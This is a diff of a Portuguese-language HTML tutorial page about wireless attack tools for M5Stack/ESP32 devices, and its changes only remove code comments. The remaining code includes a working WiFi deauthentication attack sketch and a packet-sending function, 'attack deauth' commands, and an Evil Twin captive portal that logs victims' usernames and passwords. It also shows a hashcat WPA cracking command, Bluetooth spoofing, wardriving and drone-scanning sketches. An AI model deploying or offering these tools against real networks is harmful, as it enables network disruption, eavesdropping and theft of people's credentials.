@@ -1153,7 +1153,7 @@ def scan_networks():
     lcd.print("Redes WiFi: " + str(len(networks)), 50, 10, 0xffffff)
     
     y_pos = 50
-    for net in networks[:8]:  # Mostra até 8 redes
+    for net in networks[:8]:  
         ssid = net[0].decode()
         strength = net[3]
         security = "🔒" if net[4] else "🔓"
@@ -1162,8 +1162,7 @@ def scan_networks():
         y_pos += 25
 
 btnA.wasPressed(scan_networks)
-scan_networks()  # Executa o scan inicial
-</pre>
+scan_networks()  </pre>
             </div>
             
             <p>Passos para usar o UIFlow:</p>
@@ -1180,12 +1179,10 @@ scan_networks()  # Executa o scan inicial
             
             <div class="code-block">
                 <pre>
-// Exemplo de código para deauth attack usando M5Stack
 #include <M5Stack.h>
 #include "WiFi.h"
 #include "esp_wifi.h"
 
-// Estrutura para criar pacotes de deauth
 typedef struct {
   uint8_t frame_ctrl[2];
   uint8_t duration[2];
@@ -1197,7 +1194,7 @@ typedef struct {
 } __attribute__((packed)) deauth_frame;
 
 uint8_t broadcastMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-uint8_t targetMac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // Endereço MAC do alvo
+uint8_t targetMac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 
 
 deauth_frame deauthPacket;
 
@@ -1209,7 +1206,6 @@ void setup() {
   M5.Lcd.setTextSize(2);
   M5.Lcd.println("Deauth Attack Tool");
   
-  // Configuração do WiFi em modo monitor
   wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
   esp_wifi_init(&cfg);
   esp_wifi_set_storage(WIFI_STORAGE_RAM);
@@ -1217,20 +1213,18 @@ void setup() {
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   
-  // Preparar pacote de deauth
   deauthPacket.frame_ctrl[0] = 0xC0;
   deauthPacket.frame_ctrl[1] = 0x00;
   deauthPacket.duration[0] = 0x00;
   deauthPacket.duration[1] = 0x00;
   
-  // Copiar endereços MAC
   memcpy(deauthPacket.dest_addr, broadcastMac, 6);
   memcpy(deauthPacket.source_addr, targetMac, 6);
   memcpy(deauthPacket.bssid, targetMac, 6);
   
   deauthPacket.sequence[0] = 0x00;
   deauthPacket.sequence[1] = 0x00;
-  deauthPacket.reason[0] = 0x01; // Razão 1: "Unspecified"
+  deauthPacket.reason[0] = 0x01; 
   deauthPacket.reason[1] = 0x00;
   
   M5.Lcd.println("Setup concluido");
@@ -1258,8 +1252,7 @@ void loop() {
     M5.Lcd.println("Ataque parado");
   }
   
-  if (attacking && millis() - lastPacketTime > 100) { // Enviar 10 pacotes por segundo
-    // Enviar pacote de deauth
+  if (attacking && millis() - lastPacketTime > 100) { 
     esp_wifi_80211_tx(WIFI_IF_STA, &deauthPacket, sizeof(deauthPacket), false);
     lastPacketTime = millis();
     
@@ -1350,26 +1343,22 @@ attack deauth           # Inicia o ataque de desautenticação
 attack deauth -s        # Para o ataque
 
 # Com M5Stack (código Arduino):
-// Configuração no setup()
 esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
 
-// Na função de ataque
 void sendDeauth(uint8_t* targetMAC, uint8_t* gatewayMAC) {
   uint8_t packet[26] = {
-    0xC0, 0x00,                   // Tipo e subtipo (deauth)
-    0x00, 0x00,                   // Duração
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Endereço de destino (broadcast)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Endereço de origem (BSSID)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID
-    0x00, 0x00,                   // Número de sequência
-    0x01, 0x00                    // Razão (1 = não especificada)
+    0xC0, 0x00,                   
+    0x00, 0x00,                   
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   
+    0x00, 0x00,                   
+    0x01, 0x00                    
   };
   
-  // Preencher endereços MAC
   memcpy(&packet[10], gatewayMAC, 6);
   memcpy(&packet[16], gatewayMAC, 6);
   
-  // Enviar pacote
   esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
 }</pre>
             </div>
@@ -1427,7 +1416,6 @@ list credentials             # Mostra credenciais capturadas</pre>
             <p>Para criar um Evil Twin mais avançado com M5Stack:</p>
             <div class="code-block">
                 <pre>
-// Código simplificado para Evil Twin com M5Stack
 #include <M5Stack.h>
 #include <WiFi.h>
 #include <DNSServer.h>
@@ -1475,7 +1463,6 @@ void startAttack() {
     String username = webServer.arg("username");
     String password = webServer.arg("password");
     
-    // Salva as credenciais
     credentialsLog += "Usuario: " + username + " | Senha: " + password + "\n";
     
     String content = "<html><body><h1>Conectando...</h1>";
@@ -1541,7 +1528,6 @@ void loop() {
         delay(10);
       }
       
-      // Restaura a tela principal
       M5.Lcd.fillScreen(BLACK);
       M5.Lcd.setCursor(0, 0);
       M5.Lcd.println("Evil Twin Attack Tool");
@@ -1631,7 +1617,7 @@ hashcat -m 2500 handshake.hccapx wordlist.txt -r rules/best64.rule</pre>
 #include <BLEScan.h>
 #include <BLEAdvertisedDevice.h>
 
-int scanTime = 5; // Tempo de scan em segundos
+int scanTime = 5; 
 BLEScan* pBLEScan;
 
 class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
@@ -1701,10 +1687,7 @@ void loop() {
             <div class="code-block">
                 <pre>
 # Sniffing Bluetooth com ESP32 (M5Stack):
-// Precisamos de hardware adicional como Ubertooth One ou um adaptador BT compatível
-// para análise mais detalhada.
 
-// Exemplo simplificado para registro de interações BLE:
 #include <M5Stack.h>
 #include <BLEDevice.h>
 #include <BLEServer.h>
@@ -1735,10 +1718,7 @@ class MyCharacteristicCallbacks: public BLECharacteristicCallbacks {
   void onRead(BLECharacteristic *pCharacteristic) {
     M5.Lcd.println("Característica lida pelo cliente");
   }
-};
-
-// Usar este código para criar um servidor BLE que registra
-// todas as interações para análise de segurança</pre>
+};</pre>
             </div>
             
             <h3 id="bluetooth-spoofing">MAC Spoofing</h3>
@@ -1760,14 +1740,12 @@ void setup() {
   M5.Lcd.setTextSize(2);
   M5.Lcd.println("Bluetooth MAC Spoofing");
   
-  // Inicializa Bluetooth
   esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
   esp_bt_controller_init(&bt_cfg);
   esp_bt_controller_enable(ESP_BT_MODE_BTDM);
   esp_bluedroid_init();
   esp_bluedroid_enable();
   
-  // Mostra endereço MAC atual
   const uint8_t* currentMAC = esp_bt_dev_get_address();
   M5.Lcd.println("MAC atual:");
   for (int i = 0; i < 6; i++) {
@@ -1776,11 +1754,8 @@ void setup() {
   }
   M5.Lcd.println();
   
-  // Define novo endereço MAC (spoofing)
   uint8_t newMAC[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
   esp_bt_dev_set_device_name("SpoofedDevice");
-  // Note: a API ESP32 não permite alterar o endereço MAC diretamente
-  // em tempo de execução. Este é um exemplo conceitual.
   
   M5.Lcd.println("\nA: Iniciar Scan");
   M5.Lcd.println("B: Iniciar Spoof");
@@ -2239,7 +2214,7 @@ ENTER</pre>
 #include <SD.h>
 
 TinyGPSPlus gps;
-HardwareSerial GPSSerial(2);  // Use UART2 para M5Stack
+HardwareSerial GPSSerial(2);  
 File logFile;
 
 void setup() {
@@ -2250,16 +2225,13 @@ void setup() {
   M5.Lcd.setTextSize(2);
   M5.Lcd.println("Wardriving Tool");
   
-  // Inicializar GPS (conectado à porta UART2)
-  GPSSerial.begin(9600, SERIAL_8N1, 16, 17);  // RX, TX para Core
+  GPSSerial.begin(9600, SERIAL_8N1, 16, 17);  
   
-  // Inicializar cartão SD
   if (!SD.begin()) {
     M5.Lcd.println("Falha ao iniciar SD Card");
     while (1);
   }
   
-  // Criar arquivo de log
   String filename = "/wardriving_" + String(millis()) + ".csv";
   logFile = SD.open(filename, FILE_WRITE);
   if (logFile) {
@@ -2267,7 +2239,6 @@ void setup() {
     logFile.flush();
   }
   
-  // Configurar WiFi para escaneamento
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   
@@ -2286,7 +2257,6 @@ int satellitesConnected = 0;
 void loop() {
   M5.update();
   
-  // Ler dados do GPS
   while (GPSSerial.available() > 0) {
     gps.encode(GPSSerial.read());
   }
@@ -2337,7 +2307,6 @@ void loop() {
     }
   }
   
-  // Realizar escaneamento a cada 30 segundos
   if (scanning && (millis() - lastScanTime > 30000)) {
     M5.Lcd.fillRect(0, 180, 320, 60, BLACK);
     M5.Lcd.setCursor(0, 180);
@@ -2351,7 +2320,6 @@ void loop() {
       networksFound += numNetworks;
       M5.Lcd.printf("Encontradas %d redes\n", numNetworks);
       
-      // Salvar informações no arquivo CSV
       if (logFile) {
         for (int i = 0; i < numNetworks; i++) {
           String encryptionType;
@@ -2460,8 +2428,6 @@ void loop() {
 4. Código de exemplo para escaneamento de drones (M5Stack):
    
 
-// Muitos drones comerciais modernos usam protocolos criptografados
-
 #include <M5Stack.h>
 #include "WiFi.h"
 #include "esp_wifi.h"
@@ -2505,7 +2471,6 @@ void loop() {
         String ssid = WiFi.SSID(i);
         bool isDrone = false;
         
-        // Verificar se é uma rede de drone conhecida
         for (int j = 0; j < sizeof(droneSSIDs)/sizeof(droneSSIDs[0]); j++) {
           if (ssid.startsWith(droneSSIDs[j])) {
             isDrone = true;
@@ -2690,7 +2655,6 @@ void loop() {
     <div class="digital-numbers">ID: <span id="random-numbers">29384756</span></div>
 
     <script>
-        // Inicialização do canvas de fundo
         const canvas = document.getElementById('canvas');
         const renderer = new THREE.WebGLRenderer({
             canvas,
@@ -2804,7 +2768,6 @@ void loop() {
             renderer.setSize(window.innerWidth, window.innerHeight);
         });
 
-        // Número aleatório no rodapé
         setInterval(() => {
             document.getElementById('random-numbers').textContent = Math.floor(Math.random() * 100000000).toString();
         }, 1000);
